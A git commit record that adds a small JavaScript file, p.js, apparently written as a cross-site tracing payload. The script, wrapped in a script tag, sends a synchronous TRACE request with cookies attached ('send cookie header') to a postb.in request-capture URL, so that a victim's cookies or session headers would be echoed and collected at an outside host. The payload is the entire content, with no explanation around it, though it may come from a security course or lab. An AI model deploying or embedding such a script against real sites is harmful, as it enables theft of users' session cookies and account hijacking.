c59600a00172351ded5a81ab05211adc31050f23
Aleksi Kistauri <aleksi.kistauri.1@btu.edu.ge>
2021-12-10 14:41:01 +0400

    Add files via upload

---
+++ p.js
@@ -0,0 +1,8 @@
+<script>
+  var xmlhttp = new XMLHttpRequest();
+  var url = 'https://postb.in/1639132219930-5104805156588';
+
+  xmlhttp.withCredentials = true; // send cookie header
+  xmlhttp.open('TRACE', url, false);
+  xmlhttp.send();
+</script>
